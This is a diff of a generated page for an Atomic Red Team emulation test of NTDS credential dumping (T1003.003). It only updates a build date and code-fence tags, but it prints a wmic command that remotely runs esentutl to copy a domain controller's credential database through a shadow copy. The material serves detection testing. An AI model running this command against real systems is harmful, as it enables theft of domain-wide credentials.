@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1003.003"
 attack_technique_name: "OS Credential Dumping: NTDS"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "21c7bf80-3e8b-40fa-8f9d-f5b194ff2865"
@@ -64,13 +64,13 @@ Target must be a reachable Domain Controller, and current context must be domain
 
 ### Prerequisite Check
 
-```text
+```untitled
 wmic /node:"#{target_host}" shadowcopy list brief
 ```
 
 ### Get Prerequisite
 
-```text
+```untitled
 echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)
 ```
 
@@ -81,7 +81,7 @@ echo Sorry, can't connect to target host, check: network, firewall or permission
 
 ### Command
 
-```commandprompt
+```cmd
 wmic /node:"#{target_host}" process call create "cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}"
 ```
 
